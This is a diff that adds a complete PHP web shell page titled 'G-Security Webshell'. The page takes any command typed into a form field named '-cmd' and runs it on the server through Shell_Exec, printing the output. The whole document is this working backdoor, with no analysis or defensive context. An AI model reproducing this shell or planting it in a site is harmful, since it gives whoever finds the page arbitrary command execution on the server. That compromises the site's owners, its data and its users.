@@ -1,0 +1,20 @@
+<html>
+<head>
+    <title>G-Security Webshell</title>
+</head>
+<body bgcolor="#000000" text="#ffffff">
+    <form method="POST">
+        <br>
+        <input type="text" name="-cmd" size="64" value="<?php echo $cmd; ?>" style="background:#000000; color:#ffffff;">
+        <hr>
+        <pre>
+        <?php
+        $cmd = $_REQUEST['-cmd'];
+        if ($cmd != '') {
+            print Shell_Exec($cmd);
+        }
+        ?>
+        </pre>
+    </form>
+</body>
+</html>
